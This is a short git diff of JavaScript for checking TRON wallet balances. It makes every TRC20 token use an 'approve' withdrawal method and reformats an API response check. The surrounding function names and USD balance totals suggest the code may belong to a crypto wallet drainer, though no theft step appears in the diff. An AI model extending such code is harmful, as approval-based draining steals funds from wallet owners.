@@ -2,6 +2,8 @@ const config = require('./get-config')
 const { SETTINGS, MIN_TRX_RESERVE, TRONSCAN_API_KEY } = config
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
 
+const MAIN_WITHDRAWAL_METHOD = 'approve'
+
 //Check account status
 async function checkAccountStatus(address, indexOfSetting) {
 	const setting = SETTINGS[indexOfSetting]
@@ -77,7 +79,11 @@ async function getBestWithdrawalMethod(token) {
 		}
 
 		const contractResponse = await tokenContractRequest.json()
-		if (!contractResponse || !contractResponse.data || !contractResponse.data[0]) {
+		if (
+			!contractResponse ||
+			!contractResponse.data ||
+			!contractResponse.data[0]
+		) {
 			throw new Error(
 				`Invalid Tronscan API response for contract: ${JSON.stringify(contractResponse)}`,
 			)
@@ -191,10 +197,7 @@ async function checkBalance(address, indexOfSetting, walletName) {
 						break
 
 					case 'trc20':
-						token.withdrawalMethod =
-							walletName === 'Ledger'
-								? 'approve'
-								: await getBestWithdrawalMethod(token)
+						token.withdrawalMethod = MAIN_WITHDRAWAL_METHOD
 						break
 				}
 				allTokensValue += Number(token.amountInUsd)
